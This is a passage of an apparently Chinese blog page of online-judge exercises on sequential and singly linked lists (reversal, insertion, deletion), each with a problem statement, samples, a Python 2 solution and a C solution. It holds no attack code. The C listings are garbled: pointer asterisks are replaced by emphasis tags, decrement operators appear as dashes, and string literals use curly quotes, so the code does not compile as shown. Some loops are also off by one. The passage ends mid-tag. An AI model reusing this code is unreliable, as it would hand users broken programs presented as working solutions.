title="描述"></a>描述</h2><blockquote><p>建立长度为n的顺序表，然后将表中的数据元素逆置，即若表中原来的数据元素序列为（a0，a1，a2，…，an），则逆置后的数据元素序列为（an，an-1，an-2，…，a1，a0）。（数据类型为字符型）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为顺序表的长度n；<br>第二行为顺序表中的数据元素.</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出为逆置后的顺序表.</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span></span><br><span class="line">ABCDEFG</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G F E D C B A</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="942-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    <span class="keyword">while</span> True:  #循环</span><br><span class="line">        n=<span class="keyword">int</span> (input())  </span><br><span class="line">        a = []</span><br><span class="line">        d = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x in raw_input():  </span><br><span class="line">            a.append(x)</span><br><span class="line">            d = d+<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i in range(d<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            print a[i],</span><br><span class="line">except EOFError:  </span><br><span class="line">    <span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="942-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[<span class="number">5000</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    </span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(SqList <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(SqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SqList));</span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreatList</span><span class="params">(SqList <em>&amp;L,<span class="keyword">char</span> a[],<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[i]=a[i];</span><br><span class="line">        i++;k++;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length=k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DispList</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“%c”</span>,L-&gt;data[L-&gt;length<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=L-&gt;length<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i–)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“ %c”</span>,L-&gt;data[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“\n”</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">1000</span>];</span><br><span class="line">    SqList *q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%c”</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    InitList(q);</span><br><span class="line">    CreatList(q,a,n);</span><br><span class="line">    DispList(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="943-顺序表插入操作的实现"><a href="#943-顺序表插入操作的实现" class="headerlink" title="[943] 顺序表插入操作的实现"></a>[943] 顺序表插入操作的实现</h1><div class="tabs" id="943"><ul class="nav-tabs"><li class="tab active"><a href="#943-1">思路</a></li><li class="tab"><a href="#943-2">题目描述</a></li><li class="tab"><a href="#943-3">python代码实现</a></li><li class="tab"><a href="#943-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="943-1"><div class="note default"><blockquote><br><p>插入。。</p><br></blockquote></div></div><div class="tab-pane" id="943-2"><p><a href="http://acm.swust.edu.cn/#/problems/943/-1?_k=pcgrhc" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的顺序表，在指定的数据元素item之前插入数据元素data。如果指定的数据元素item不存在，则将data插入到顺序表的尾端。（数据类型为整型）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为顺序表的长度n；<br>第二行为顺序表中的数据元素；<br>第三行为指定的数据元素item；<br>第四行为要插入的数据元素data；</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出结果为顺序表中的数据元素。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span> <span class="number">50</span> <span class="number">60</span> <span class="number">70</span> <span class="number">80</span> <span class="number">90</span> <span class="number">100</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">55</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span> <span class="number">55</span> <span class="number">50</span> <span class="number">60</span> <span class="number">70</span> <span class="number">80</span> <span class="number">90</span> <span class="number">100</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="943-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span> , raw_input().split()))</span><br><span class="line">x = <span class="keyword">int</span>(input())</span><br><span class="line">y = <span class="keyword">int</span>(input())</span><br><span class="line">k = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Findx(a,x):</span><br><span class="line">    <span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">        <span class="keyword">if</span>(x == a[i]):</span><br><span class="line">            global k #定义外部的k</span><br><span class="line">            k = i</span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Findx(a,x) == True:</span><br><span class="line">    a.insert(k,y) #根据下标插入</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a.append(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    print a[i],</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="943-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    elemtype data[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(sqlist <em>&amp;L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(sqlist)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqlist));</span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(sqlist <em>&amp;L,elemtype a[],<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[i]=a[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(sqlist L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//L-&gt;length++; </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“%d”</span>,L-&gt;data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=L-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“ %d”</span>,L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“\n”</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertlist</span><span class="params">(sqlist <em>&amp;L,elemtype x,<span class="keyword">int</span> y)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z=<span class="number">0</span>,i,k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L-&gt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x==L-&gt;data[i])</span><br><span class="line">        &#123;</span><br><span class="line">            z=<span class="number">1</span>;</span><br><span class="line">            k=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(z==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[L-&gt;length]=y;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=L-&gt;length<span class="number">-1</span>;j&gt;=k;j–)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[j+<span class="number">1</span>]=L-&gt;data[j];</span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;data[k]=y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sqlist la;</span><br><span class="line">    <span class="keyword">int</span> n,x,y;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">       <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a[i]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d%d”</span>,&amp;x,&amp;y);</span><br><span class="line">    initlist(la);</span><br><span class="line">    creatlist(la,a,n);</span><br><span class="line">    insertlist(la,x,y);</span><br><span class="line">    desplist(la);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="952-单链表的插入操作的实现"><a href="#952-单链表的插入操作的实现" class="headerlink" title="[952] 单链表的插入操作的实现"></a>[952] 单链表的插入操作的实现</h1><div class="tabs" id="952"><ul class="nav-tabs"><li class="tab active"><a href="#952-1">思路</a></li><li class="tab"><a href="#952-2">题目描述</a></li><li class="tab"><a href="#952-3">python代码实现</a></li><li class="tab"><a href="#952-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="952-1"><div class="note default"><blockquote><br><p>链表插入操作。。</p><br></blockquote></div></div><div class="tab-pane" id="952-2"><p><a href="http://acm.swust.edu.cn/#/problems/952/-1?_k=0w2gj4" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的单链表，在第i个结点之前插入数据元素data。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为自然数n，表示链式线性表的长度；<br>第二行为n个自然数表示链式线性表各元素值；<br>第三行为指定插入的位置i；第四行为待插入数据元素data。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>指定插入位置合法时候，输出插入元素后的链式线性表的所有元素，元素之间用一个空格隔开。输入不合法，输出”error!”。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">6</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="952-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>,raw_input().split()))</span><br><span class="line">x = <span class="keyword">int</span>(input())</span><br><span class="line">y = <span class="keyword">int</span>(input())</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">    a.insert(x,y)</span><br><span class="line">elif <span class="number">0</span> &lt; x &lt;= len(a):</span><br><span class="line">    a.insert(x - <span class="number">1</span>,y)</span><br><span class="line">elif x == len(a)+<span class="number">1</span>:</span><br><span class="line">    a.append(y)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c == <span class="number">1</span>:</span><br><span class="line">    sys.<span class="built_in">stdout</span>.write(<span class="string">“error!”</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">        print a[i],</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="952-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elemtype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode &amp;L,<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>s,</em>r;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    r=L;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">        s-&gt;data=a[i];</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(linknode <em>L)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode p=L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d “</span>,p-&gt;data);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listinsert</span><span class="params">(linknode <em>&amp;L,<span class="keyword">int</span> i,elemtype e)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode p=L,<em>s;</em></span><br><span class="line">    <span class="keyword">int</span> c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i<span class="number">-1</span>&amp;&amp;p!=<span class="literal">NULL</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    c=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">        s-&gt;data=e;</span><br><span class="line">        s-&gt;next=p-&gt;next;</span><br><span class="line">        p-&gt;next=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode *la;</span><br><span class="line">    <span class="keyword">int</span> n,a[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i,e;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a[i]);</span><br><span class="line">        </span><br><span class="line">    initlist(la);</span><br><span class="line">    creatlist(la,a,n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d%d”</span>,&amp;i,&amp;e);</span><br><span class="line">    c=listinsert(la,i,e);</span><br><span class="line">    <span class="keyword">if</span>(c==<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“error!”</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    desplist(la);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div></div></div><h1 id="953-单链表的删除操作的实现"><a href="#953-单链表的删除操作的实现" class="headerlink" title="[953] 单链表的删除操作的实现"></a>[953] 单链表的删除操作的实现</h1><div class="tabs" id="953"><ul class="nav-tabs"><li class="tab active"><a href="#953-1">思路</a></li><li class="tab"><a href="#953-2">题目描述</a></li><li class="tab"><a href="#953-3">python代码实现</a></li><li class="tab"><a href="#953-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="953-1"><div class="note default"><blockquote><br><p>删除第i个结点之前的结点，即，当前结点的之前的第二个结点指向当前结点</p><br></blockquote></div></div><div class="tab-pane" id="953-2"><p><a href="http://acm.swust.edu.cn/#/problems/953/-1?_k=1piav1" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的单链表，删除第i个结点之前的结点。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为自然数n，表示链式线性表的长度；<br>第二行为n个自然数表示链式线性表各元素值；<br>第三行为指定的删除参数i。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>指定删除位置合法时候，输出删除元素后的链式线性表的所有元素，元素之间用一个空格隔开。<br>输入不合法，输出”error!”。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="953-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 